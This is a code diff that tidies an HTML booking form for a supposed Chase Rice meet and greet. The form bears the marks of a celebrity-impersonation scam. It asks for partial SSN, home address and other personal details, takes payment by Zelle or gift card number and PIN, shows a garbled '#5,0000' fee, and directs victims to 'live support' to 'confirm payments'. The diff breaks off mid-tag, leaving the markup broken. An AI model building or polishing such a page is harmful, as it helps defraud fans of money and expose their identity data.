@@ -1209,53 +1209,108 @@ See you soon, Chase Rice</p>
   <div id="step2" class="container">
     <h3>MEET AND GREET FORM FOR CHASE RICE</h3>
     <h4>EVENT DETAILS</h4>
-    <label>Event Name:</label>
-    <input type="text" id="eventNameInput" name="event_name" required>
-    <label>Date of Event:</label>
+    <label for="eventNameInput">Event Name:</label>
+    <input type="text" id="eventNameInput" name="event_name" placeholder="Enter event name" required>
+
+    <label for="eventDateInput">Date of Event:</label>
     <input type="date" id="eventDateInput" name="event_date" required>
-    <label>Time of Event:</label>
+
+    <label for="eventTimeInput">Time of Event:</label>
     <input type="time" id="eventTimeInput" name="event_time" required>
-    <label>Location of Event:</label>
-    <input type="text" id="eventLocationInput" name="event_location" required>
+
+    <label for="eventLocationInput">Location of Event:</label>
+    <input type="text" id="eventLocationInput" name="event_location" placeholder="Enter event location" required>
+
     <button type="button" id="toStep3">Next</button>
   </div>
 
   <!-- Step 3: Attendee Information -->
   <div id="step3" class="container" style="display:none;">
     <h3>ATTENDEE INFORMATION</h3>
-    <label>Name:</label><input type="text" id="attendeeNameInput" name="name" required>
-    <label>Phone Number:</label><input type="tel" name="phone" required>
-    <label>Last 4 digits of SSN:</label><input type="text" name="ssn_last4" maxlength="4" required>
-    <label>Age:</label><input type="number" name="age" required>
-    <label>Occupation:</label><input type="text" name="occupation">
-    <label>Home Address:</label><input type="text" name="address">
-    <label>ZIP code:</label><input type="text" name="zip">
-    <label>Sex:</label><select name="sex"><option>Male</option><option>Female</option><option>Other</option></select>
-    <label>Email Address:</label><input type="email" id="attendeeEmailInput" name="email" required>
-    <label>Marital status:</label><select name="marital_status"><option>Single</option><option>Married</option><option>Other</option></select>
-    <label>Emergency contact:</label><input type="text" name="emergency_contact">
+    <label for="attendeeNameInput">Name:</label>
+    <input type="text" id="attendeeNameInput" name="name" placeholder="Enter your full name" required>
+
+    <label for="phone">Phone Number:</label>
+    <input type="tel" id="phone" name="phone" placeholder="Enter phone number" required>
+
+    <label for="ssn_last4">Last 4 digits of SSN:</label>
+    <input type="text" id="ssn_last4" name="ssn_last4" maxlength="4" placeholder="1234" required>
+
+    <label for="age">Age:</label>
+    <input type="number" id="age" name="age" placeholder="Enter age" required>
+
+    <label for="occupation">Occupation:</label>
+    <input type="text" id="occupation" name="occupation" placeholder="Enter occupation">
+
+    <label for="address">Home Address:</label>
+    <input type="text" id="address" name="address" placeholder="Enter home address">
+
+    <label for="zip">ZIP code:</label>
+    <input type="text" id="zip" name="zip" placeholder="Enter ZIP code">
+
+    <label for="sex">Sex:</label>
+    <select id="sex" name="sex" required>
+      <option value="">-- Select --</option>
+      <option value="Male">Male</option>
+      <option value="Female">Female</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <label for="attendeeEmailInput">Email Address:</label>
+    <input type="email" id="attendeeEmailInput" name="email" placeholder="Enter email address" required>
+
+    <label for="marital_status">Marital Status:</label>
+    <select id="marital_status" name="marital_status" required>
+      <option value="">-- Select --</option>
+      <option value="Single">Single</option>
+      <option value="Married">Married</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <label for="emergency_contact">Emergency contact:</label>
+    <input type="text" id="emergency_contact" name="emergency_contact" placeholder="Enter emergency contact">
+
     <button type="button" id="toStep4">Next</button>
   </div>
 
   <!-- Step 4: Meet & Greet Details -->
   <div id="step4" class="container" style="display:none;">
     <h3>MEET & GREET DETAILS</h3>
-    <label>Celebrity Guest:</label><input type="text" name="celebrity_guest" required>
-    <label>Meet & Greet Time:</label><input type="time" name="meet_greet_time" required>
-    <label>Meet & Greet Location:</label><input type="text" name="meet_greet_location" required>
-    <label>Number of Guests:</label><input type="number" name="number_of_guests" required>
-    <label>Special Request:</label><select name="special_request"><option>Autographs</option><option>Photo</option><option>Both</option></select>
+    <label for="celebrity_guest">Celebrity Guest:</label>
+    <input type="text" id="celebrity_guest" name="celebrity_guest" placeholder="Enter celebrity guest" required>
+
+    <label for="meet_greet_time">Meet & Greet Time:</label>
+    <input type="time" id="meet_greet_time" name="meet_greet_time" required>
+
+    <label for="meet_greet_location">Meet & Greet Location:</label>
+    <input type="text" id="meet_greet_location" name="meet_greet_location" placeholder="Enter location" required>
+
+    <label for="number_of_guests">Number of Guests:</label>
+    <input type="number" id="number_of_guests" name="number_of_guests" placeholder="Enter number of guests" required>
+
+    <label for="special_request">Special Request:</label>
+    <select id="special_request" name="special_request">
+      <option>Autographs</option>
+      <option>Photo</option>
+      <option>Both</option>
+    </select>
+
     <button type="button" id="toStep5">Next</button>
   </div>
 
   <!-- Step 5: Security & Release -->
   <div id="step5" class="container" style="display:none;">
     <h3>SECURITY & RELEASE</h3>
-    <p><input type="checkbox" name="security_ack" required> I understand that security measures will be in place.</p>
-    <p><input type="checkbox" name="photo_permission" required> I grant permission for photos & videos to be taken.</p>
-    <p><input type="checkbox" name="insurance_ack" required> I understand insurance policies must be ensured for safety.</p>
-    <label>Signature:</label><input type="text" name="signature" required>
-    <label>Date:</label><input type="date" name="release_date" required>
+    <label><input type="checkbox" name="security_ack" required> I understand that security measures will be in place.</label>
+    <label><input type="checkbox" name="photo_permission" required> I grant permission for photos & videos to be taken.</label>
+    <label><input type="checkbox" name="insurance_ack" required> I understand insurance policies must be ensured for safety.</label>
+
+    <label for="signature">Signature:</label>
+    <input type="text" id="signature" name="signature" placeholder="Enter signature" required>
+
+    <label for="release_date">Date:</label>
+    <input type="date" id="release_date" name="release_date" required>
+
     <p><strong>Meet & Greet Fee: #5,0000</strong></p>
     <button type="button" id="toPayment">Next</button>
   </div>
@@ -1263,7 +1318,7 @@ See you soon, Chase Rice</p>
   <!-- Final Step: Payment -->
   <div id="paymentStep" class="container" style="display:none;">
     <h3>Payment Method</h3>
-    <label>Select Payment Method:</label>
+    <label for="paymentMethod">Payment Method:</label>
     <select id="paymentMethod" name="payment_method" required>
       <option value="">-- Select --</option>
       <option value="Zelle">💸 Zelle</option>
@@ -1273,10 +1328,11 @@ See you soon, Chase Rice</p>
     </select>
 
     <div id="giftCardDetails" style="display:none; margin-top:15px;">
-      <label>Gift Card Number:</label>
-      <input type="text" id="giftCardNumber" name="giftcard_number">
-      <label>Gift Card PIN:</label>
-      <input type="text" id="giftCardPin" name="giftcard_pin">
+      <label for="giftCardNumber">Gift Card Number:</label>
+      <input type="text" id="giftCardNumber" name="giftcard_number" placeholder="Enter gift card number">
+
+      <label for="giftCardPin">Gift Card PIN:</label>
+      <input type="text" id="giftCardPin" name="giftcard_pin" placeholder="Enter gift card PIN">
     </div>
 
     <button type="submit">Finish</button>
@@ -1291,14 +1347,7 @@ See you soon, Chase Rice</p>
     <li><strong>Ticket Number:</strong> <span id="ticketNumber"></span></li>
     <li><strong>Event:</strong> <span id="eventName"></span></li>
     <li><strong>Name:</strong> <span id="userName"></span></li>
-    <li><strong>Email:</strong> <span id="userEmail"></span></li>
-  </ul>
-    <li style="margin-top:10px; color:#d35400; font-weight:bold;">
-      📢 Contact live support to validate your ticket and confirm your payments and schedule
-    </li>
-  </ul>
-  <button id="homeBtn" style="margin-top:15px; background-color:#333; color:#fff; padding:10px 20px;">Back to Home</button>
-</div>
+    <li><strong>Email:</strong> <span id="userEmail
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
